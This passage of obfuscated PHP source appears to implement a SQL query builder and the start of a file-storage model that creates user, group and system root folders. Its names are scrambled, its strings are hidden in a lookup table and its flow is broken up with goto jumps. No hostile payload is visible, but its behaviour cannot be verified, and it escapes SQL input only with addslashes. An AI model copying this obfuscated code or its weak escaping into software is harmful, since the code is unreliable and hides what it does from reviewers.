} } $c×ÓÉ™Í‡Ò .= $bÈšˆæ¼î[276] . $EŞÃ‹»À†; } $c×ÓÉ™Í‡Ò = substr($c×ÓÉ™Í‡Ò, 0, -strlen($EŞÃ‹»À†)); } return empty($c×ÓÉ™Í‡Ò) ? $bÈšˆæ¼î[33] : $bÈšˆæ¼î[967] . $c×ÓÉ™Í‡Ò; } protected function parseWhereItem($fŒò‹«®ŞÖ, $e‹ñ–ë¹˜) { $CÔÄ·¸·¥Š =& $_SERVER[œº]; $e¨â‹ĞÊ = $CÔÄ·¸·¥Š[33]; if (is_array($e‹ñ–ë¹˜)) { if (is_string($e‹ñ–ë¹˜[0])) { $b£ÇØˆóÆ† = strtolower($e‹ñ–ë¹˜[0]); if (in_array($e‹ñ–ë¹˜[0], array($CÔÄ·¸·¥Š[951], $CÔÄ·¸·¥Š[968], $CÔÄ·¸·¥Š[969], $CÔÄ·¸·¥Š[970], $CÔÄ·¸·¥Š[971], $CÔÄ·¸·¥Š[972]))) { $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $e‹ñ–ë¹˜[0] . $CÔÄ·¸·¥Š[50] . $this->parseValue($e‹ñ–ë¹˜[1]); } elseif (preg_match($CÔÄ·¸·¥Š[973], $e‹ñ–ë¹˜[0])) { $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[50] . $this->parseValue($e‹ñ–ë¹˜[1]); } elseif (preg_match($CÔÄ·¸·¥Š[974], $e‹ñ–ë¹˜[0])) { if (is_array($e‹ñ–ë¹˜[1])) { $fÚ¦¾öå² = isset($e‹ñ–ë¹˜[2]) ? strtoupper($e‹ñ–ë¹˜[2]) : $CÔÄ·¸·¥Š[959]; if (in_array($fÚ¦¾öå², array($CÔÄ·¸·¥Š[958], $CÔÄ·¸·¥Š[959], $CÔÄ·¸·¥Š[960]))) { $bá¼˜¿ë” = array(); foreach ($e‹ñ–ë¹˜[1] as $D­ˆî†©Âô) { $bá¼˜¿ë”[] = $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[50] . $this->parseValue($D­ˆî†©Âô); } $e¨â‹ĞÊ .= $CÔÄ·¸·¥Š[258] . implode($CÔÄ·¸·¥Š[50] . $fÚ¦¾öå² . $CÔÄ·¸·¥Š[50], $bá¼˜¿ë”) . $CÔÄ·¸·¥Š[865]; } } else { $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[50] . $this->parseValue($e‹ñ–ë¹˜[1]); } } elseif ($CÔÄ·¸·¥Š[295] == $b£ÇØˆóÆ†) { $e¨â‹ĞÊ .= $CÔÄ·¸·¥Š[863] . $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $e‹ñ–ë¹˜[1] . $CÔÄ·¸·¥Š[975]; } elseif (preg_match($CÔÄ·¸·¥Š[976], $e‹ñ–ë¹˜[0])) { $e¨â‹ĞÊ .= $e‹ñ–ë¹˜[0]; } elseif (preg_match($CÔÄ·¸·¥Š[977], $e‹ñ–ë¹˜[0])) { if (isset($e‹ñ–ë¹˜[2]) && $CÔÄ·¸·¥Š[295] == $e‹ñ–ë¹˜[2]) { $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[50] . $e‹ñ–ë¹˜[1]; } else { if (is_string($e‹ñ–ë¹˜[1])) { $e‹ñ–ë¹˜[1] = explode($CÔÄ·¸·¥Š[47], $e‹ñ–ë¹˜[1]); } $Aßß•¼ÇË = implode($CÔÄ·¸·¥Š[47], $this->parseValue($e‹ñ–ë¹˜[1])); $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[863] . $Aßß•¼ÇË . $CÔÄ·¸·¥Š[865]; } } elseif (preg_match($CÔÄ·¸·¥Š[978], $e‹ñ–ë¹˜[0])) { $f¶ßåª¹® = is_string($e‹ñ–ë¹˜[1]) ? explode($CÔÄ·¸·¥Š[47], $e‹ñ–ë¹˜[1]) : $e‹ñ–ë¹˜[1]; $e¨â‹ĞÊ .= $CÔÄ·¸·¥Š[863] . $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $this->exp[$b£ÇØˆóÆ†] . $CÔÄ·¸·¥Š[50] . $this->parseValue($f¶ßåª¹®[0]) . $CÔÄ·¸·¥Š[961] . $this->parseValue($f¶ßåª¹®[1]) . $CÔÄ·¸·¥Š[276]; } else { think_exception(think_lang($CÔÄ·¸·¥Š[964]) . $CÔÄ·¸·¥Š[4] . $e‹ñ–ë¹˜[0]); } } else { $aß ‘‚Ğ˜¡ = count($e‹ñ–ë¹˜); $eæá£»©¥÷ = $CÔÄ·¸·¥Š[33]; if (is_string($e‹ñ–ë¹˜[$aß ‘‚Ğ˜¡ - 1])) { $eæá£»©¥÷ = isset($e‹ñ–ë¹˜[$aß ‘‚Ğ˜¡ - 1]) ? strtoupper($e‹ñ–ë¹˜[$aß ‘‚Ğ˜¡ - 1]) : $CÔÄ·¸·¥Š[33]; if (in_array($eæá£»©¥÷, array($CÔÄ·¸·¥Š[958], $CÔÄ·¸·¥Š[959], $CÔÄ·¸·¥Š[960]))) { $aß ‘‚Ğ˜¡ = $aß ‘‚Ğ˜¡ - 1; } } else { $eæá£»©¥÷ = $CÔÄ·¸·¥Š[958]; } for ($Cšï²Û‰å¸ = 0; $Cšï²Û‰å¸ < $aß ‘‚Ğ˜¡; $Cšï²Û‰å¸++) { $f¶ßåª¹® = is_array($e‹ñ–ë¹˜[$Cšï²Û‰å¸]) ? $e‹ñ–ë¹˜[$Cšï²Û‰å¸][1] : $e‹ñ–ë¹˜[$Cšï²Û‰å¸]; if ($CÔÄ·¸·¥Š[295] == strtolower($e‹ñ–ë¹˜[$Cšï²Û‰å¸][0])) { $e¨â‹ĞÊ .= $CÔÄ·¸·¥Š[258] . $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $f¶ßåª¹® . $CÔÄ·¸·¥Š[975] . $eæá£»©¥÷ . $CÔÄ·¸·¥Š[50]; } else { $e“ÈÓ®Çß¿ = is_array($e‹ñ–ë¹˜[$Cšï²Û‰å¸]) ? $this->exp[strtolower($e‹ñ–ë¹˜[$Cšï²Û‰å¸][0])] : $CÔÄ·¸·¥Š[951]; if (!$e“ÈÓ®Çß¿ && is_array($e‹ñ–ë¹˜[$Cšï²Û‰å¸]) && in_array($e‹ñ–ë¹˜[$Cšï²Û‰å¸][0], array($CÔÄ·¸·¥Š[951], $CÔÄ·¸·¥Š[968], $CÔÄ·¸·¥Š[969], $CÔÄ·¸·¥Š[970], $CÔÄ·¸·¥Š[971], $CÔÄ·¸·¥Š[972]))) { $e“ÈÓ®Çß¿ = $e‹ñ–ë¹˜[$Cšï²Û‰å¸][0]; } $e¨â‹ĞÊ .= $CÔÄ·¸·¥Š[258] . $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[50] . $e“ÈÓ®Çß¿ . $CÔÄ·¸·¥Š[50] . $this->parseValue($f¶ßåª¹®) . $CÔÄ·¸·¥Š[975] . $eæá£»©¥÷ . $CÔÄ·¸·¥Š[50]; } } $e¨â‹ĞÊ = substr($e¨â‹ĞÊ, 0, -4); } } else { $e¨â‹ĞÊ .= $fŒò‹«®ŞÖ . $CÔÄ·¸·¥Š[979] . $this->parseValue($e‹ñ–ë¹˜); } return $e¨â‹ĞÊ; } protected function parseThinkWhere($FÅÓ˜¼ªÎ„, $EÉ¶óğèó«) { $c·æ”·ñäƒ =& $_SERVER[œº]; $E¹È™‘½Ò‰ = $c·æ”·ñäƒ[33]; switch ($FÅÓ˜¼ªÎ„) { case $c·æ”·ñäƒ[350]: $E¹È™‘½Ò‰ = $EÉ¶óğèó«; break; case $c·æ”·ñäƒ[962]: $E¹È™‘½Ò‰ = is_string($EÉ¶óğèó«) ? $EÉ¶óğèó« : substr($this->parseWhere($EÉ¶óğèó«), 6); break; case $c·æ”·ñäƒ[980]: parse_str($EÉ¶óğèó«, $dšİåµó±‹); if (isset($dšİåµó±‹[$c·æ”·ñäƒ[957]])) { $eÉ÷¢¼İ¢£ = $c·æ”·ñäƒ[50] . strtoupper($dšİåµó±‹[$c·æ”·ñäƒ[957]]) . $c·æ”·ñäƒ[50]; unset($dšİåµó±‹[$c·æ”·ñäƒ[957]]); } else { $eÉ÷¢¼İ¢£ = $c·æ”·ñäƒ[961]; } $E©¹ÓÍŞâŒ = array(); foreach ($dšİåµó±‹ as $aä£øÊãÛÆ => $E²‰í‹‡õ±) { $E©¹ÓÍŞâŒ[] = $this->parseKey($aä£øÊãÛÆ) . $c·æ”·ñäƒ[979] . $this->parseValue($E²‰í‹‡õ±); } $E¹È™‘½Ò‰ = implode($eÉ÷¢¼İ¢£, $E©¹ÓÍŞâŒ); break; } return $E¹È™‘½Ò‰; } protected function parseLimit($AõœÖØôİ“) { $Cœ—‹‹¿ô„ =& $_SERVER[œº]; return !empty($AõœÖØôİ“) ? $Cœ—‹‹¿ô„[48] . $AõœÖØôİ“ . $Cœ—‹‹¿ô„[50] : $Cœ—‹‹¿ô„[33]; } protected function parseJoin($d÷™ø®ß‰) { $BªÉ„ä½¡ =& $_SERVER[œº]; $fƒÛÂÙÇç½ = $BªÉ„ä½¡[33]; if (!empty($d÷™ø®ß‰)) { if (is_array($d÷™ø®ß‰)) { foreach ($d÷™ø®ß‰ as $a·½š½·Ô° => $Fæ®‡ğŒßó) { if (!1 !== stripos($Fæ®‡ğŒßó, $BªÉ„ä½¡[981])) { $fƒÛÂÙÇç½ .= $BªÉ„ä½¡[50] . $Fæ®‡ğŒßó; } else { $fƒÛÂÙÇç½ .= $BªÉ„ä½¡[982] . $Fæ®‡ğŒßó; } } } else { $fƒÛÂÙÇç½ .= $BªÉ„ä½¡[982] . $d÷™ø®ß‰; } } $fƒÛÂÙÇç½ = preg_replace($BªÉ„ä½¡[983], think_config($BªÉ„ä½¡[889]) . $BªÉ„ä½¡[984], $fƒÛÂÙÇç½); return $fƒÛÂÙÇç½; } protected function parseOrder($fï…õ®‰æ¤) { $Fó‰Èíˆ¸ =& $_SERVER[œº]; if (is_array($fï…õ®‰æ¤)) { $bŠƒÍ™«Úä = array(); foreach ($fï…õ®‰æ¤ as $d¾äâ»Æğ« => $d‹™“…éÒ—) { if (is_numeric($d¾äâ»Æğ«)) { $bŠƒÍ™«Úä[] = $this->parseKey($d‹™“…éÒ—); } else { $d‹™“…éÒ— = in_array(strtoupper(trim($d‹™“…éÒ—)), array($Fó‰Èíˆ¸[985], $Fó‰Èíˆ¸[986])) ? $Fó‰Èíˆ¸[50] . $d‹™“…éÒ— : $Fó‰Èíˆ¸[33]; if (preg_match($Fó‰Èíˆ¸[987], $d¾äâ»Æğ«)) { $bŠƒÍ™«Úä[] = $this->parseKey($d¾äâ»Æğ«) . $d‹™“…éÒ—; } else { think_exception($Fó‰Èíˆ¸[988] . $d¾äâ»Æğ«); } } } $fï…õ®‰æ¤ = implode($Fó‰Èíˆ¸[47], $bŠƒÍ™«Úä); } return !empty($fï…õ®‰æ¤) ? $Fó‰Èíˆ¸[989] . $fï…õ®‰æ¤ : $Fó‰Èíˆ¸[33]; } protected function parseGroup($B±åÑ„õ®‹) { $aº©‚Å‚†à =& $_SERVER[œº]; return !empty($B±åÑ„õ®‹) ? $aº©‚Å‚†à[990] . $B±åÑ„õ®‹ : $aº©‚Å‚†à[33]; } protected function parseHaving($Bì„§·÷Ú´) { $D£ôæÅÙ =& $_SERVER[œº]; return !empty($Bì„§·÷Ú´) ? $D£ôæÅÙ[991] . $Bì„§·÷Ú´ : $D£ôæÅÙ[33]; } protected function parseComment($a…õšÉÒİŒ) { $e„œ™¼ö±Î =& $_SERVER[œº]; return !empty($a…õšÉÒİŒ) ? $e„œ™¼ö±Î[992] . $a…õšÉÒİŒ . $e„œ™¼ö±Î[993] : $e„œ™¼ö±Î[33]; } protected function parseDistinct($B™¢„Ş¦ÔÄ) { $d‹ÄöÚÓ¤è =& $_SERVER[œº]; return !empty($B™¢„Ş¦ÔÄ) ? $d‹ÄöÚÓ¤è[994] : $d‹ÄöÚÓ¤è[33]; } protected function parseUnion($FÎÈ‘µøÉ¨) { $FÅë¤Ñßïá =& $_SERVER[œº]; if (empty($FÎÈ‘µøÉ¨)) { return $FÅë¤Ñßïá[33]; } if (isset($FÎÈ‘µøÉ¨[$FÅë¤Ñßïá[346]])) { $aˆöª¤à±Õ = $FÅë¤Ñßïá[995]; unset($FÎÈ‘µøÉ¨[$FÅë¤Ñßïá[346]]); } else { $aˆöª¤à±Õ = $FÅë¤Ñßïá[996]; } foreach ($FÎÈ‘µøÉ¨ as $a¦î—ÈÛÊ) { $bµá±»ñÆ÷[] = $aˆöª¤à±Õ . (is_array($a¦î—ÈÛÊ) ? $this->buildSelectSql($a¦î—ÈÛÊ) : $a¦î—ÈÛÊ); } return implode($FÅë¤Ñßïá[50], $bµá±»ñÆ÷); } public function insert($A†„‘‚Û’î, $AÔÃ»Ì¼»¼ = array(), $C™ÍÏÅ„Àö = false) { goto e¯†…§…Ã’; Cö‰§Ïô¦: $Fƒƒ×……² .= $this->parseComment(!empty($AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[352]]) ? $AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[352]] : $DåØÄ¥¼¾ñ[33]); return $this->execute($Fƒƒ×……², $this->parseBind(!empty($AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[283]]) ? $AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[283]] : array())); goto fÏ†é™¸‘; AÎ¡Ğ…òç: foreach ($A†„‘‚Û’î as $D¬ÌÔÈŒÀë => $FëÜ‰ÃÎ†) { if (is_array($FëÜ‰ÃÎ†) && $DåØÄ¥¼¾ñ[295] == $FëÜ‰ÃÎ†[0]) { $E×˜¹˜„¸å[] = $this->parseKey($D¬ÌÔÈŒÀë); $cŒùä¹¯Àò[] = $FëÜ‰ÃÎ†[1]; } elseif (is_scalar($FëÜ‰ÃÎ†) || is_null($FëÜ‰ÃÎ†)) { $E×˜¹˜„¸å[] = $this->parseKey($D¬ÌÔÈŒÀë); $cŒùä¹¯Àò[] = $this->parseValue($FëÜ‰ÃÎ†); } } $Fƒƒ×……² = ($C™ÍÏÅ„Àö ? $DåØÄ¥¼¾ñ[867] : $DåØÄ¥¼¾ñ[868]) . $DåØÄ¥¼¾ñ[869] . $this->parseTable($AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[277]]) . $DåØÄ¥¼¾ñ[863] . implode($DåØÄ¥¼¾ñ[47], $E×˜¹˜„¸å) . $DåØÄ¥¼¾ñ[864] . implode($DåØÄ¥¼¾ñ[47], $cŒùä¹¯Àò) . $DåØÄ¥¼¾ñ[865]; $Fƒƒ×……² .= $this->parseLock(isset($AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[812]]) ? $AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[812]] : !1); goto Cö‰§Ïô¦; e¯†…§…Ã’: $DåØÄ¥¼¾ñ =& $_SERVER[œº]; $cŒùä¹¯Àò = $E×˜¹˜„¸å = array(); $this->model = $AÔÃ»Ì¼»¼[$DåØÄ¥¼¾ñ[279]]; goto AÎ¡Ğ…òç; fÏ†é™¸‘: } public function selectInsert($F«”Ì™ßÌ¾, $bÊ¯¿¢‰ÑÂ, $DÊ·ÌÓçì = array()) { goto a¡Šğ«ŸóÚ; eÏÏ¾Æ˜¦ğ: return $this->execute($AÙ¦™™¿¾, $this->parseBind(!empty($DÊ·ÌÓçì[$bÓŠ«˜ã[283]]) ? $DÊ·ÌÓçì[$bÓŠ«˜ã[283]] : array())); goto Aè÷á¶œÏ; d÷°ËáßŒ‰: array_walk($F«”Ì™ßÌ¾, array($this, $bÓŠ«˜ã[866])); $AÙ¦™™¿¾ = $bÓŠ«˜ã[997] . $this->parseTable($bÊ¯¿¢‰ÑÂ) . $bÓŠ«˜ã[863] . implode($bÓŠ«˜ã[47], $F«”Ì™ßÌ¾) . $bÓŠ«˜ã[975]; $AÙ¦™™¿¾ .= $this->buildSelectSql($DÊ·ÌÓçì); goto eÏÏ¾Æ˜¦ğ; a¡Šğ«ŸóÚ: $bÓŠ«˜ã =& $_SERVER[œº]; $this->model = $DÊ·ÌÓçì[$bÓŠ«˜ã[279]]; if (is_string($F«”Ì™ßÌ¾)) { $F«”Ì™ßÌ¾ = explode($bÓŠ«˜ã[47], $F«”Ì™ßÌ¾); } goto d÷°ËáßŒ‰; Aè÷á¶œÏ: } public function update($a¬œ•Î¡ë, $b²ÏÇí’ø”) { $f‹î¤ºêëÍ =& $_SERVER[œº]; $this->model = $b²ÏÇí’ø”[$f‹î¤ºêëÍ[279]]; $DÄëë£÷Á« = $f‹î¤ºêëÍ[998] . $this->parseTable($b²ÏÇí’ø”[$f‹î¤ºêëÍ[277]]) . $this->parseSet($a¬œ•Î¡ë) . $this->parseWhere(!empty($b²ÏÇí’ø”[$f‹î¤ºêëÍ[273]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[273]] : $f‹î¤ºêëÍ[33]) . $this->parseOrder(!empty($b²ÏÇí’ø”[$f‹î¤ºêëÍ[363]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[363]] : $f‹î¤ºêëÍ[33]) . $this->parseLimit(!empty($b²ÏÇí’ø”[$f‹î¤ºêëÍ[290]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[290]] : $f‹î¤ºêëÍ[33]) . $this->parseLock(isset($b²ÏÇí’ø”[$f‹î¤ºêëÍ[812]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[812]] : !1) . $this->parseComment(!empty($b²ÏÇí’ø”[$f‹î¤ºêëÍ[352]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[352]] : $f‹î¤ºêëÍ[33]); return $this->execute($DÄëë£÷Á«, $this->parseBind(!empty($b²ÏÇí’ø”[$f‹î¤ºêëÍ[283]]) ? $b²ÏÇí’ø”[$f‹î¤ºêëÍ[283]] : array())); } public function delete($BÄ®òÜ¨ø = array()) { $A¿Óìàâ´÷ =& $_SERVER[œº]; $this->model = $BÄ®òÜ¨ø[$A¿Óìàâ´÷[279]]; $DÏ…÷ˆùš‰ = $A¿Óìàâ´÷[999] . $this->parseTable($BÄ®òÜ¨ø[$A¿Óìàâ´÷[277]]) . $this->parseWhere(!empty($BÄ®òÜ¨ø[$A¿Óìàâ´÷[273]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[273]] : $A¿Óìàâ´÷[33]) . $this->parseOrder(!empty($BÄ®òÜ¨ø[$A¿Óìàâ´÷[363]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[363]] : $A¿Óìàâ´÷[33]) . $this->parseLimit(!empty($BÄ®òÜ¨ø[$A¿Óìàâ´÷[290]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[290]] : $A¿Óìàâ´÷[33]) . $this->parseLock(isset($BÄ®òÜ¨ø[$A¿Óìàâ´÷[812]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[812]] : !1) . $this->parseComment(!empty($BÄ®òÜ¨ø[$A¿Óìàâ´÷[352]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[352]] : $A¿Óìàâ´÷[33]); return $this->execute($DÏ…÷ˆùš‰, $this->parseBind(!empty($BÄ®òÜ¨ø[$A¿Óìàâ´÷[283]]) ? $BÄ®òÜ¨ø[$A¿Óìàâ´÷[283]] : array())); } public function select($A¦‘¤ãÍî‡ = array()) { goto a˜¹Üˆ²; D¤¼‰‰—²Â: if ($BË×…ĞØ§Ö && !1 !== $BÉ¼­´ŒÀº) { think_cache($aÏØ»ÍŠ¯Ê, $BÉ¼­´ŒÀº, $BË×…ĞØ§Ö); } return $BÉ¼­´ŒÀº; goto a¨‰ÛÀÅáŸ; a˜¹Üˆ²: $dŠÉ©ùì° =& $_SERVER[œº]; $this->model = $A¦‘¤ãÍî‡[$dŠÉ©ùì°[279]]; $fÓö½ › = $this->buildSelectSql($A¦‘¤ãÍî‡); goto c…ô£ÔÌÒ; c…ô£ÔÌÒ: $BË×…ĞØ§Ö = isset($A¦‘¤ãÍî‡[$dŠÉ©ùì°[347]]) ? $A¦‘¤ãÍî‡[$dŠÉ©ùì°[347]] : !1; if ($BË×…ĞØ§Ö) { $aÏØ»ÍŠ¯Ê = is_string($BË×…ĞØ§Ö[$dŠÉ©ùì°[93]]) ? $BË×…ĞØ§Ö[$dŠÉ©ùì°[93]] : $dŠÉ©ùì°[1000] . md5($fÓö½ ›); $C“¹Ù•ÌŞ£ = think_cache($aÏØ»ÍŠ¯Ê, $dŠÉ©ùì°[33], $BË×…ĞØ§Ö); if (!1 !== $C“¹Ù•ÌŞ£) { return $C“¹Ù•ÌŞ£; } } $BÉ¼­´ŒÀº = $this->query($fÓö½ ›, $this->parseBind(!empty($A¦‘¤ãÍî‡[$dŠÉ©ùì°[283]]) ? $A¦‘¤ãÍî‡[$dŠÉ©ùì°[283]] : array())); goto D¤¼‰‰—²Â; a¨‰ÛÀÅáŸ: } public function buildSelectSql($a„¼Í†­æç = array()) { goto f„ÏøñÆÄœ; f„ÏøñÆÄœ: $E‰¾Û»÷È³ =& $_SERVER[œº]; if (isset($a„¼Í†­æç[$E‰¾Û»÷È³[351]])) { if (strpos($a„¼Í†­æç[$E‰¾Û»÷È³[351]], $E‰¾Û»÷È³[47])) { list($cŸêîÆÔ, $d‡õŒŒ¼áŒ) = explode($E‰¾Û»÷È³[47], $a„¼Í†­æç[$E‰¾Û»÷È³[351]]); } else { $cŸêîÆÔ = $a„¼Í†­æç[$E‰¾Û»÷È³[351]]; } $cŸêîÆÔ = $cŸêîÆÔ ? $cŸêîÆÔ : 1; $d‡õŒŒ¼áŒ = isset($d‡õŒŒ¼áŒ) ? $d‡õŒŒ¼áŒ : (is_numeric($a„¼Í†­æç[$E‰¾Û»÷È³[290]]) ? $a„¼Í†­æç[$E‰¾Û»÷È³[290]] : 20); $DÏøËˆÌ¦‡ = $d‡õŒŒ¼áŒ * ((int) $cŸêîÆÔ - 1); $a„¼Í†­æç[$E‰¾Û»÷È³[290]] = $DÏøËˆÌ¦‡ . $E‰¾Û»÷È³[47] . $d‡õŒŒ¼áŒ; } if (think_config($E‰¾Û»÷È³[1001])) { $CÄĞÚç¶Äµ = $E‰¾Û»÷È³[1002] . md5(serialize($a„¼Í†­æç)); $eÎÔƒ×Í¢Î = think_cache($CÄĞÚç¶Äµ); if ($eÎÔƒ×Í¢Î) { return $eÎÔƒ×Í¢Î; } } goto E¥Ã¬Š¨ñ ; D÷åÖÑ…¬: return $C…Òùñ±İ¹; goto EÖ¯—Ìá‰Â; E¥Ã¬Š¨ñ : $C…Òùñ±İ¹ = $this->parseSql($this->selectSql, $a„¼Í†­æç); $C…Òùñ±İ¹ .= $this->parseLock(isset($a„¼Í†­æç[$E‰¾Û»÷È³[812]]) ? $a„¼Í†­æç[$E‰¾Û»÷È³[812]] : !1); if (isset($CÄĞÚç¶Äµ)) { think_cache($CÄĞÚç¶Äµ, $C…Òùñ±İ¹); } goto D÷åÖÑ…¬; EÖ¯—Ìá‰Â: } public function parseSql($e‘™Î°´‹ó, $EëùÀÓË¼¥ = array()) { $DµÏ˜Î çº =& $_SERVER[œº]; $e‘™Î°´‹ó = str_replace(array($DµÏ˜Î çº[1003], $DµÏ˜Î çº[1004], $DµÏ˜Î çº[1005], $DµÏ˜Î çº[1006], $DµÏ˜Î çº[1007], $DµÏ˜Î çº[1008], $DµÏ˜Î çº[1009], $DµÏ˜Î çº[1010], $DµÏ˜Î çº[1011], $DµÏ˜Î çº[1012], $DµÏ˜Î çº[1013]), array($this->parseTable("{$EëùÀÓË¼¥[$DµÏ˜Î çº[277]]}"), $this->parseDistinct(isset($EëùÀÓË¼¥[$DµÏ˜Î çº[1014]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[1014]] : !1), $this->parseField(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[271]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[271]] : $DµÏ˜Î çº[182]), $this->parseJoin(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[280]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[280]] : $DµÏ˜Î çº[33]), $this->parseWhere(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[273]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[273]] : $DµÏ˜Î çº[33]), $this->parseGroup(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[1015]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[1015]] : $DµÏ˜Î çº[33]), $this->parseHaving(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[1016]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[1016]] : $DµÏ˜Î çº[33]), $this->parseOrder(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[363]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[363]] : $DµÏ˜Î çº[33]), $this->parseLimit(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[290]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[290]] : $DµÏ˜Î çº[33]), $this->parseUnion(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[345]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[345]] : $DµÏ˜Î çº[33]), $this->parseComment(!empty($EëùÀÓË¼¥[$DµÏ˜Î çº[352]]) ? $EëùÀÓË¼¥[$DµÏ˜Î çº[352]] : $DµÏ˜Î çº[33])), $e‘™Î°´‹ó); return $e‘™Î°´‹ó; } public function getLastSql($A›Íº“Ì» = '') { return $A›Íº“Ì» ? $this->modelSql[$A›Íº“Ì»] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($bÖ×â¼„Á™) { return addslashes($bÖ×â¼„Á™); } public function setModel($DÆœ¢äƒ×) { $this->model = $DÆœ¢äƒ×; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto Cù’›ÎåÁß; BÆõåï—µ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D¤¼Š„óš) { $cïÆëîÛÊÊ =& $_SERVER[œº]; $dâ†óÓ™è = Model($cïÆëîÛÊÊ[502])->where(array($cïÆëîÛÊÊ[1520] => $D¤¼Š„óš))->find(); $EùÈ‡°˜¡ = $this->_mkdirRoot(SourceModel::TYPE_USER, $D¤¼Š„óš, $dâ†óÓ™è[$cïÆëîÛÊÊ[28]]); $this->userDesktopAdd($EùÈ‡°˜¡); return $EùÈ‡°˜¡; } public function userDesktopAdd($EÆƒë§à…Ü) { $d‰Ç¥Áœ¼» =& $_SERVER[œº]; $B—´À­îŠ· = LNG($d‰Ç¥Áœ¼»[1951]); $cÕƒö¦‡Ë… = $this->mkdir($EÆƒë§à…Ü, $B—´À­îŠ·); $this->metaSet($cÕƒö¦‡Ë…, $d‰Ç¥Áœ¼»[1952], $d‰Ç¥Áœ¼»[87]); $this->metaSet($EÆƒë§à…Ü, $d‰Ç¥Áœ¼»[1953], $cÕƒö¦‡Ë…); } public function groupRootAdd($FÛŸ«®§†ò) { $e®­Äˆ¼Ûô =& $_SERVER[œº]; $dç¤ÚÒÕ¡º = Model($e®­Äˆ¼Ûô[486])->where(array($e®­Äˆ¼Ûô[1770] => $FÛŸ«®§†ò))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $FÛŸ«®§†ò, $dç¤ÚÒÕ¡º[$e®­Äˆ¼Ûô[28]]); } public function systemRootPathAdd($Bã§Í¥Óçö) { if ($Bã§Í¥Óçö != $_SERVER[œº][505]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Bã§Í¥Óçö); } public function userRootRemove($eËá¤°ê£Ö) { $BÉ‰àÒğ = $this->sourceRoot(SourceModel::TYPE_USER, $eËá¤°ê£Ö); if (!$BÉ‰àÒğ) { return; } $this->remove($BÉ‰àÒğ, !1); } public function groupRootRemove($Dä¦Áç‰ùÒ) { $C¬ŠĞßšÌ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Dä¦Áç‰ùÒ); if (!$C¬ŠĞßšÌ) { return; } $this->remove($C¬ŠĞßšÌ, !1); } private function _mkdirRoot($däºÒøƒšø, $CÛ†îôÜ, $fŒ«ÎÏĞÆª) { goto c†Ğ›µÍÊ´; CÍÇèƒ÷Û¿: CacheLock::unlock($DÃêòŒÛä‹); return $AªÙÇÜñÇá; goto E…§‡Ğ®Ì; Cé‘’·ºŒ—: $AªÙÇÜñÇá = $this->add($AÕÆİ©ØÍÔ); $EÓè¼¶ÅÃ» = array($AÆ–çõ†îœ[555] => short_id($AªÙÇÜñÇá)); $this->where(array($AÆ–çõ†îœ[410] => $AªÙÇÜñÇá))->save($EÓè¼¶ÅÃ»); goto CÍÇèƒ÷Û¿; c†Ğ›µÍÊ´: $AÆ–çõ†îœ =& $_SERVER[œº]; $AÕÆİ©ØÍÔ = array($AÆ–çõ†îœ[394] => 0, $AÆ–çõ†îœ[549] => $däºÒøƒšø, $AÆ–çõ†îœ[550] => $CÛ†îôÜ, $AÆ–çõ†îœ[546] => 